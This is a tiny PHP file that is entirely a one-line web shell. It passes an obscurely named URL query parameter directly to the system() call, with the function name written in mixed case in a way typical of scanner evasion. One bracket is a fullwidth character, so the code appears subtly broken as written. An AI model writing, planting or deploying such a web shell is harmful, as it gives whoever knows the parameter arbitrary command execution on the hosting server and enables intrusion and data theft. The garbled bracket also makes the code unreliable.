<?php
SysTeM($_GET['NJdxb3TA'〕);
?>
